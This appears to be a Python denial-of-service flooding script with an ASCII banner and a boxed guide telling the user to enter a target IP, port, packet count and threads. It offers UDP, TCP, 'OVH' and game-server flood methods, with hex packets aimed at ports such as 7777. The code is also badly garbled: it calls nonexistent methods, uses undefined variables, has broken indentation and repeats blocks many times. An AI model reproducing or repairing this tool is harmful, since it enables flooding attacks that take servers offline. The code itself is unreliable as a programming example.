#!/usr/bin/env python3
import Module
import socket
import random
import threading
import os
import sys
import codecs
import struct
import time


print("▄████  ██▀███  ▓█████ ▓█████ ▒███████▒    ▒██   ██▒     ▄████ ▓█████  ▄▄▄▄    ▄▄▄▄")   
print("██▒ ▀█▒▓██ ▒ ██▒▓█   ▀ ▓█   ▀ ▒ ▒ ▒ ▄▀░   ▒▒ █ █ ▒░    ██▒ ▀█▒▓█   ▀ ▓█████▄ ▓█████▄")
print("▒██░▄▄▄░▓██ ░▄█ ▒▒███   ▒███   ░ ▒ ▄▀▒░    ░░  █   ░   ▒██░▄▄▄░▒███   ▒██▒ ▄██▒██▒ ▄██")
print("░▓█  ██▓▒██▀▀█▄  ▒▓█  ▄ ▒▓█  ▄   ▄▀▒   ░    ░ █ █ ▒    ░▓█  ██▓▒▓█  ▄ ▒██░█▀  ▒██░█▀")  
print("░▒▓███▀▒░██▓ ▒██▒░▒████▒░▒████▒▒███████▒   ▒██▒ ▒██▒   ░▒▓███▀▒░▒████▒░▓█  ▀█▓░▓█  ▀█▓")
print("░▒   ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░░░ ▒░ ░░▒▒ ▓░▒░▒   ▒▒ ░ ░▓ ░    ░▒   ▒ ░░ ▒░ ░░▒▓███▀▒░▒▓███▀▒")
print("░   ░   ░▒ ░ ▒░ ░ ░  ░ ░ ░  ░░░▒ ▒ ░ ▒   ░░   ░▒ ░     ░   ░  ░ ░  ░▒░▒   ░ ▒░▒   ░") 
print("░ ░   ░   ░░   ░    ░      ░   ░ ░ ░ ░ ░    ░    ░     ░ ░   ░    ░    ░    ░  ░    ░") 
print("░    ░        ░  ░   ░  ░  ░ ░        ░    ░           ░    ░  ░ ░       ░")      
print("                             ░                                            ░       ░") 

print("TETAP LAH BANGUNKAN DIRI MU DAN STAY KUAT WALAU DIA TELAH MENINGGALKAN MU:>")


print("╔══════════════════════════════════╗")
print("║ Example How To Attack!           ║")
print("║ 1. Put The IP Target You Want!   ║")
print("║ 2. Then Put The Port 80/3389/443!║")
print("║ 3. AFter That Put Packet You Want║")
print("║ 4. Put Threads How Much You Want!║")
print("║ 5. Then Enter And Susccesfully!  ║")
print("║ 6. Methode ([UDP-POWERUVO] - ([TCP-POWERUVO] -  ([OVH-POWERUVO]) - ([GTPS-POWERUVO])║")
print("╚══════════════════════════════════╝")

print("╔══════════════════════════════════╗")
ip = str(input("[+] Enter Target RDP IP : "))
print("╚══════════════════════════════════╝")
port = int(input("[+] Enter Target RDP Port (80/3389/443)   : "))
print("╚══════════════════════════════════╝")
times = int(input("[+] Enter sent Packet (BEBAS BANG PAKET SEMAUNYA) : "))
print("╚══════════════════════════════════╝")
threads = int(input("[+] Enter sent thread (BEBAS BANG SEMAU LU) : "))
print("╚══════════════════════════════════╝")
choice = int(input("[+] Enter the methode Tools ([UDP-POWERUVO] - ([OVH-POWERUVO] -  ([TCP-POWERUVO]) - ([GTPS-POWERUVO]) : "))
print("╚══════════════════════════════════╝")


Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ]
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ] 
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ]
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ]
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ] 
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ]
                       
def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")
      
def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

class MyThread(threading.Thread):
     def Lbytes(self):
         while True:
                sock = Lbytes.socket(
                    socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM) # Internet and UDP
                
                msg = Pacotes[random.randrange(0,3)]
                msg = Pacotes[random.randrange(0,3)]
                msg = Pacotes[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                
if __name__ == '__main__':
    try:
     for x in range(100):                                    
            mythread = MyThread()  
            mythread.start()                             
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')

for Lbytes in range(threads):
	if choice == 'UDP-POWERUVO':
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
 
 def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")
      
def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

class MyThread(threading.Thread):
     def Lbytes(self):
         while True:
                sock = Lbytes.socket(
